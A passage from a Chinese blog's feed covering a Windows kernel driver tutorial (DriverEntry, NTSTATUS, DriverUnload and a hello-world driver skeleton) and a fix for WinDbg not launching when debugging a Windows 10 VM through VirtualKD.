class="code"><pre><span class="line"><span class="meta">kd&gt;</span><span class="bash"> dt nt!_UNICODE_STRING 0x00000000`9336c000</span></span><br></pre></td></tr></table></figure><p><img src="https://image.zeronohacker.com/article/2020/04/05/D6DA8C567C7FE2CCB8994767C5A9EE35.png" alt=""></p><p>从上图可看出 Buffer 字符串长度为 59，又因为为宽字符类型，所以占用 118 字节，用十六进制表示为 0x76，正好为上面 Length 和 MaximumLength 大小，这说明此时的 Buffer 字符串没有 <code>\0</code> 结尾。</p><p>pRegistryPath 表示的是这个驱动所对应的注册表位置，我们知道，内核驱动是作为 windows 系统服务存在的，不同服务是通过服务名来识别的。一个 sys 驱动文件需要运行，首先会把该服务信息写入到注册表中，以服务名作为一个注册表的键名，如上图所示。</p><p>关于返回值，DriverEntry 的返回值类型为 NTSTATUS，定义如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> _Return_type_success_(<span class="keyword">return</span> &gt;= <span class="number">0</span>) LONG NTSTATUS;</span><br></pre></td></tr></table></figure><p>所以说 DriverEntry 的返回值类型实际为 LONG 类型，windows 操作系统规定 DriverEntry 返回 STATUS_SUCCESS 表示成功，返回其他值表示失败。实际上 STATUS_SUCCESS 是一个宏定义，如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STATUS_SUCCESS ((NTSTATUS)0x00000000L) <span class="comment">// ntsubauth</span></span></span><br></pre></td></tr></table></figure><p>内核驱动作为 windows 服务运行，在执行具体代码前，驱动 SYS 文件首先会被映射到内核地址空间，作为内核的一个驱动模块，接着系统对这个驱动模块执行导入表初始化、修正重定位表中对应的数据偏移操作，最后系统会调用该驱动模块的 DriverEntry 入口函数，如果这个入口函数返回 STATUS_SUCCESS，系统认为这个驱动初始化成功；如果这个入口函数返回除 STATUS_SUCCESS 以外的其他值，系统认为驱动初始化失败，系统执行一系列的清理工作，并把驱动模块从内核空间中删除，从用户角度看，就是服务启动失败。</p><p>关于驱动卸载函数，当一个内核驱动被要求停止时，DriverObject-&gt;DriverUnload 指向的函数就会被系统调用，开发者可以在这个函数中执行一些清理相关工作。DriverUnload 函数非常重要，但重要并不等于必须，DriverUnload 函数是可选的，开发者可以不提供 DriverUnload 函数，这样做的结果是该驱动不支持停止，也就是说，只要开发者不提供 DriverUnload 函数，这个驱动对应的服务一旦启动后，再也无法停止。该特性被很多安全软件利用，刻意不提供 DriverUnload 函数，避免驱动被恶意停止。</p><div class="tip "><p>提示：驱动初始化失败不会触发 DriverUnload 函数调用，DriverUnload 只有在驱动服务成功启动后，被要求停止才会触发。</p></div><h2 id="一个基本的通用驱动程序框架"><a href="#一个基本的通用驱动程序框架" class="headerlink" title="一个基本的通用驱动程序框架"></a>一个基本的通用驱动程序框架</h2><p>以下为一个基本的通用驱动程序框架：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntddk.h&gt;</span> </span></span><br><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT pDriverObject)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (pDriverObject != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;[%s]Driver upload, Driver Object Address: %p&quot;</span>, __FUNCTION__, pDriverObject);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;[%s]Hello Kernel World!\n&quot;</span>, __FUNCTION__);</span><br><span class="line">    <span class="keyword">if</span> (pRegistryPath != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;[%s]Driver RegistryPath: %wZ\n&quot;</span>, __FUNCTION__, pRegistryPath);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (pDriverObject != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;[%s]Driver Object Address: %p\n&quot;</span>, __FUNCTION__, pDriverObject);</span><br><span class="line">        pDriverObject-&gt;DriverUnload = DriverUnload;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;内核入口函数&quot;&gt;&lt;a href=&quot;#内核入口函数&quot; class=&quot;headerlink&quot; title=&quot;内核入口函数&quot;&gt;&lt;/a&gt;内核入口函数&lt;/h2&gt;&lt;p&gt;具有 windows 应用层（用户态）开发经验的朋友应该很清楚，windows 应用程序有统一的 WinMa</summary>
      
    
    
    
    <category term="C/C++" scheme="https://zeronohacker.github.io/categories/C-C/"/>
    
    
    <category term="kernel" scheme="https://zeronohacker.github.io/tags/kernel/"/>
    
    <category term="driver" scheme="https://zeronohacker.github.io/tags/driver/"/>
    
  </entry>
  
  <entry>
    <title>解决 VirtualKD + Windbg 调试 win10 时无法弹出 Windbg 问题</title>
    <link href="https://zeronohacker.github.io/2020/04/05/solve-the-problem-that-windbg-cannot-pop-up-when-virtualkd-and-windbg-debugs-win10/"/>
    <id>https://zeronohacker.github.io/2020/04/05/solve-the-problem-that-windbg-cannot-pop-up-when-virtualkd-and-windbg-debugs-win10/</id>
    <published>2020-04-05T09:02:32.000Z</published>
    <updated>2021-09-19T09:11:01.309Z</updated>
    
    <content type="html"><![CDATA[<h2 id="问题复现"><a href="#问题复现" class="headerlink" title="问题复现"></a>问题复现</h2><p>将 VirtualKD 下的 target 目录复制到在虚拟机 win10 操作系统上，运行 vminstall.exe，注册好之后重启 win10，在启动项多了一个，如下所示：</p><p><img src="https://image.zeronohacker.com/article/2020/04/05/68CB783BC81CC8797C5975B4BF71C06E.jpg" alt=""></p><p>这时候打开 vmmon.exe，选择好 windbg 程序，因为上面 win10 为 32 位，所以 windbg 选择 32 位，但请注意一下：</p><div class="tip "><p>启动项那一行意思是按 F8 进入选择手动禁止签名强制选项，因为从 win8 及后面的系统驱动文件必须经过微软的数字签名后，才可以运行，否则会加载失败，这在运行了 vminstall.exe 后会提示你要注意这一点。</p></div><p>完成以上后，按 F8 进入，选择禁用驱动程序强制签名选项，回车后发现 windbg 并不会弹出（我这里是用它来调试自己编写的驱动程序）。</p><p><img src="https://image.zeronohacker.com/article/2020/04/05/4DED46D67DF478842D57342E8D746A89.jpg" alt=""></p><h2 id="如何解决"><a href="#如何解决" class="headerlink" title="如何解决"></a>如何解决</h2><p>在安装完 vminstall 后，需要先在运行中运行 msconfig 命令，显示窗口如下：</p><p><img src="https://image.zeronohacker.com/article/2020/04/05/DD0317F25B031615051FABDF51D74845.png" alt=""></p><p>选中第二个启动引导项，点击高级选项，在全局调试设置中的调试端口选择 COM1:（在打印机被移除情况下，因为打印机默认用这个端口），波特率选择 115200，点确定保存后会提示你要重启才能使更改生效，重启后，windbg 就能自动弹出了。</p><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><p>windbg 自动弹出后，需等待一会，win 10 操作系统会被中断，输入 g 命令让操作系统跑起来，进入主界面后，右下角会显示测试模式，如下所示：</p><p><img src="https://image.zeronohacker.com/article/2020/04/05/F08596103CFA343760D1D3AE470A830D.png" alt=""></p><p>此时windbg 界面如下所示：</p><p><img src="https://image.zeronohacker.com/article/2020/04/05/81F7A00C42F70B72FC785FB14C02B9C5.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;问题复现&quot;&gt;&lt;a href=&quot;#问题复现&quot; class=&quot;headerlink&quot; title=&quot;问题复现&quot;&gt;&lt;/a&gt;问题复现&lt;/h2&gt;&lt;p&gt;将 VirtualKD 下的 target 目录复制到在虚拟机 win10 操作系统上，运行 vminstall.exe，注</summary>
      
    
    
    
    <category term="C/C++" scheme="https://zeronohacker.github.io/categories/C-C/"/>
    
    
    <category term="windbg" scheme="https://zeronohacker.github.io/tags/windbg/"/>
    
    <category term="debug" scheme="https://zeronohacker.github.io/tags/debug/"/>
    
  </entry>
  
</feed>
